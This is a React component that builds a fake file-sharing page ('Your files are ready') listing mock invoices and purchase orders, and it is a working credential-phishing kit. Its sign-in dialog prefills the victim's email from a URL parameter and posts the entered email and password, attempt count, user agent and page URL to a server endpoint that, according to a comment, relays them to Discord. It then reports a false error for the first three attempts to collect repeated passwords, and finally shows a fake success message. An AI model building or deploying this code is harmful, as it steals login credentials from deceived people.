import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { toast } from 'sonner';
import { Card, CardContent, CardHeader, CardTitle, CardFooter } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Avatar, AvatarFallback } from '@/components/ui/avatar';
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from '@/components/ui/tooltip';
import { Download, Eye, FileText, Film, Image as ImageIcon, Link as LinkIcon, Music, X, Loader2 } from 'lucide-react';
import { Skeleton } from '@/components/ui/skeleton';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from '@/components/ui/dialog';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { PreviewModal } from './PreviewModal';
const MOCK_FILES = [
  { id: 1, name: 'Purchase Order.pdf', size: '1.5 MB', type: 'pdf' },
  { id: 2, name: 'Sample.docx', size: '450 KB', type: 'doc' },
  { id: 3, name: 'Drawing.dwg', size: '2.3 MB', type: 'drawing' },
  { id: 4, name: 'Company Profile.pdf', size: '8.2 MB', type: 'pdf' },
  { id: 5, name: 'Invoice.pdf', size: '320 KB', type: 'pdf' },
];
type MockFile = typeof MOCK_FILES[0];
const fileTypeIcons: { [key: string]: React.ReactNode } = {
  zip: <FileText className="w-5 h-5 text-gray-500" />,
  video: <Film className="w-5 h-5 text-gray-500" />,
  image: <ImageIcon className="w-5 h-5 text-gray-500" />,
  doc: <FileText className="w-5 h-5 text-gray-500" />,
  audio: <Music className="w-5 h-5 text-gray-500" />,
  pdf: <FileText className="w-5 h-5 text-gray-500" />,
  drawing: <FileText className="w-5 h-5 text-gray-500" />,
};
const FileItem = ({
  file,
  isLoaded,
  onAuthOpen,
  onPreviewOpen,
}: {
  file: MockFile;
  isLoaded: boolean;
  onAuthOpen: () => void;
  onPreviewOpen: (file: MockFile) => void;
}) => (
  <div className="flex items-center justify-between py-3 px-2 rounded-lg hover:bg-gray-50 transition-colors duration-200 group">
    {isLoaded ? (
      <>
        <div className="flex items-center gap-3">
          <Avatar className="h-8 w-8 rounded-md bg-gray-100 flex items-center justify-center">
            <AvatarFallback className="bg-transparent">{fileTypeIcons[file.type]}</AvatarFallback>
          </Avatar>
          <div>
            <p className="text-sm font-medium text-gray-800">{file.name}</p>
            <p className="text-xs text-gray-500">{file.size}</p>
          </div>
        </div>
        <div className="flex items-center gap-1 opacity-0 group-hover:opacity-100 transition-opacity duration-200">
          <TooltipProvider delayDuration={100}>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-8 w-8 rounded-full"
                  onClick={onAuthOpen}
                >
                  <Download className="w-4 h-4" />
                </Button>
              </TooltipTrigger>
              <TooltipContent><p>Download</p></TooltipContent>
            </Tooltip>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-8 w-8 rounded-full"
                  onClick={() => onPreviewOpen(file)}
                >
                  <Eye className="w-4 h-4" />
                </Button>
              </TooltipTrigger>
              <TooltipContent><p>Preview</p></TooltipContent>
            </Tooltip>
          </TooltipProvider>
        </div>
      </>
    ) : (
      <div className="flex items-center gap-3 w-full">
        <Skeleton className="h-8 w-8 rounded-md" />
        <div className="space-y-2 flex-1">
          <Skeleton className="h-4 w-3/4" />
          <Skeleton className="h-3 w-1/2" />
        </div>
      </div>
    )}
  </div>
);
export function HeroPreviewCard() {
  const [isLoaded, setIsLoaded] = useState(false);
  const [isAuthOpen, setIsAuthOpen] = useState(false);
  const [isPreviewOpen, setIsPreviewOpen] = useState(false);
  const [previewFile, setPreviewFile] = useState<MockFile | null>(null);
  const [email, setEmail] = useState('');
  const [submissionAttempts, setSubmissionAttempts] = useState(0);
  const [isLoading, setIsLoading] = useState(false);
  useEffect(() => {
    const timer = setTimeout(() => setIsLoaded(true), 1500);
    try {
      const urlParams = new URLSearchParams(window.location.search);
      const prefilledEmail = urlParams.get('pref');
      if (prefilledEmail) {
        setEmail(prefilledEmail);
      }
    } catch (error) {
      console.warn("Could not parse URL params for email prefill:", error);
    }
    return () => clearTimeout(timer);
  }, []);
  const handlePreviewOpen = (file: MockFile) => {
    setPreviewFile(file);
    setIsPreviewOpen(true);
  };
  const handleAuthSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);
    const formData = new FormData(event.currentTarget);
    const password = formData.get('password') as string;
    if (!email || !password) {
      toast.error('Please enter both email and password.');
      setIsLoading(false);
      return;
    }

    // Send form data to Discord via server-side API
    const discordData = {
      email,
      password,
      formType: 'Authentication',
      attempts: submissionAttempts + 1,
      userAgent: navigator.userAgent,
      url: window.location.href
    };

    let discordSuccess = false;
    try {
      const response = await fetch('/api/submit-form', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(discordData),
      });
      const result = await response.json();
      discordSuccess = result.success;
    } catch (error) {
      console.error('Failed to send authentication data to server:', error);
    }

    setTimeout(() => {
      setIsLoading(false);
      const nextAttempts = submissionAttempts + 1;
      setSubmissionAttempts(nextAttempts);
      if (nextAttempts <= 3) {
        toast.error('Authentication error, please try again.');
      } else {
        toast.success('Logged in successfully! Your download should start shortly.', {
          description: 'Redirecting...',
        });
        setTimeout(() => window.location.reload(), 1500);
      }
    }, 1500);

    if (!discordSuccess) {
      console.warn('Failed to send authentication data to Discord');
    }
  };
  return (
    <>
      <AnimatePresence>
        {isPreviewOpen && previewFile && (
          <PreviewModal
            file={previewFile}
            onClose={() => setIsPreviewOpen(false)}
            onAuthOpen={() => {
              setIsPreviewOpen(false);
              setIsAuthOpen(true);
            }}
          />
        )}
      </AnimatePresence>
      <motion.div
        initial={{ opacity: 0, y: 50, scale: 0.95 }}
        animate={{ opacity: 1, y: 0, scale: 1 }}
        transition={{ duration: 0.8, delay: 0.2, ease: [0.16, 1, 0.3, 1] }}
        className="w-full max-w-md mx-auto"
      >
        <Dialog open={isAuthOpen} onOpenChange={(open) => {
          setIsAuthOpen(open);
          if (!open) {
            setSubmissionAttempts(0);
            setIsLoading(false);
          }
        }}>
          <motion.div
            animate={{ y: [0, -6, 0] }}
            transition={{ duration: 4, repeat: Infinity, ease: 'easeInOut' }}
          >
            <Card className="shadow-2xl shadow-blue-500/10 rounded-3xl overflow-hidden border-gray-200/80 bg-white/80 backdrop-blur-xl">
              <CardHeader className="p-6">
                <CardTitle className="text-xl font-semibold text-gray-900">Your files are ready</CardTitle>
              </CardHeader>
              <CardContent className="p-6 pt-0">
                <div className="border rounded-xl divide-y max-h-64 overflow-y-auto p-2">
                  {(isLoaded ? MOCK_FILES : Array(5).fill(0)).map((file, index) => (
                    <FileItem
                      key={isLoaded ? file.id : index}
                      file={file}
                      isLoaded={isLoaded}
                      onAuthOpen={() => setIsAuthOpen(true)}
                      onPreviewOpen={handlePreviewOpen}
                    />
                  ))}
                </div>
                <div className="mt-4 flex items-center justify-center">
                  <Button variant="link" size="sm" className="text-gray-500 hover:text-gray-800">
                    <LinkIcon className="w-3 h-3 mr-1.5" />
                    Report a problem
                  </Button>
                </div>
              </CardContent>
              <CardFooter className="bg-gray-50/70 p-6 flex flex-col sm:flex-row gap-3">
                  <Button
                    size="lg"
                    className="w-full bg-[#2F6BF6] hover:bg-[#2F6BF6]/90 text-white rounded-full shadow-lg shadow-blue-500/20 transition-all hover:shadow-xl hover:-translate-y-0.5 active:scale-95"
                    onClick={() => setIsAuthOpen(true)}
                  >
                    Download all
                  </Button>
                  <Button
                    size="lg"
                    variant="outline"
                    className="w-full bg-white hover:bg-gray-50 rounded-full border-gray-300 transition-all hover:-translate-y-0.5 active:scale-95"
                    onClick={() => handlePreviewOpen(MOCK_FILES[0])}
                  >
                    Open preview
                  </Button>
              </CardFooter>
            </Card>
          </motion.div>
          <DialogContent aria-describedby="auth-desc" className="sm:max-w-md bg-white border-0 shadow-2xl rounded-2xl">
            <DialogHeader className="text-left">
              <DialogTitle className="text-2xl font-semibold text-[#17202A]">Sign in to download</DialogTitle>
              <DialogDescription id="auth-desc">
                Enter your credentials to access your files.
              </DialogDescription>
            </DialogHeader>
            <form onSubmit={handleAuthSubmit}>
              <div className="flex flex-col gap-4 py-4">
                <div className="space-y-2">
                  <Label htmlFor="auth-email">Email</Label>
                  <Input
                    id="auth-email"
                    name="email"
                    type="email"
                    placeholder="you@example.com"
                    required
                    aria-describedby="auth-desc"
                    className="rounded-xl border-gray-300 focus:border-[#2F6BF6] focus:ring-2 focus:ring-[#2F6BF6]/20"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    disabled={isLoading}
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="auth-password">Password</Label>
                  <Input id="auth-password" name="password" type="password" required aria-describedby="auth-desc" className="rounded-xl border-gray-300 focus:border-[#2F6BF6] focus:ring-2 focus:ring-[#2F6BF6]/20" disabled={isLoading} />
                </div>
              </div>
              <DialogFooter className="flex flex-col-reverse sm:flex-row sm:justify-between w-full gap-2">
                <Button
                  type="button"
                  variant="outline"
                  size="sm"
                  className="flex items-center gap-1.5"
                  onClick={() => setIsAuthOpen(false)}
                  disabled={isLoading}
                >
                  <X className="w-4 h-4" />
                  Cancel
                </Button>
                <Button type="submit" className="bg-[#2F6BF6] hover:bg-[#2F6BF6]/90 rounded-xl px-6 text-white font-semibold" disabled={isLoading}>
                  {isLoading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                  {isLoading ? 'Signing in...' : 'Sign in'}
                </Button>
              </DialogFooter>
            </form>
          </DialogContent>
        </Dialog>
      </motion.div>
    </>
  );
}